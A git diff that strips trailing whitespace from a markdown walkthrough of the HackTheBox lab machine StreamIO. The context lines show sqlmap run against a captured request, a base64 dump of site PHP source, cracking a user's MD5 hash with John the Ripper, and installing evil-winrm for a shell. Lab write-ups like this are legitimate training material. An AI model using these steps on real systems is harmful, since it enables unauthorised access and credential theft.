@@ -139,7 +139,7 @@ Nothing of interest so i've right clicked and selected Save Item from the menu. 
 ┌──(root㉿kali)-[~/htb/streamio]
 └─# sqlmap -r streamio.req
         ___
-       __H__                 
+       __H__
  ___ ___[)]_____ ___ ___  {1.6.4#stable}
 |_ -| . [.]     | .'| . |
 |___|_  [.]_|_|_|__,|___|
@@ -419,7 +419,7 @@ From the file we get back this part is interesting:
                         sKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZG
                         llKCI8aDEJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJc
                         <SNIP>
-                        ZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==         
+                        ZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==
                 </div>
         </center>
 </body>
@@ -677,7 +677,7 @@ We can crack them like before with JohnTheRipper:
 
 ```sh
 ┌──(root㉿kali)-[~/htb/streamio]
-└─# echo "389d14cb8e4e9b94b137deb1caf0612a" > nikk37.txt                      
+└─# echo "389d14cb8e4e9b94b137deb1caf0612a" > nikk37.txt
 
 ┌──(root㉿kali)-[~/htb/streamio]
 └─# john nikk37.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt 
@@ -697,7 +697,7 @@ We get a password for the user nikk37, so let's use Evil-WinRM to get a shell as
 
 ```sh
 ┌──(root㉿kali)-[~/htb/streamio]
-└─# apt install evil-winrm                                                
+└─# apt install evil-winrm
 Reading package lists... Done
 Building dependency tree... Done
 Reading state information... Done
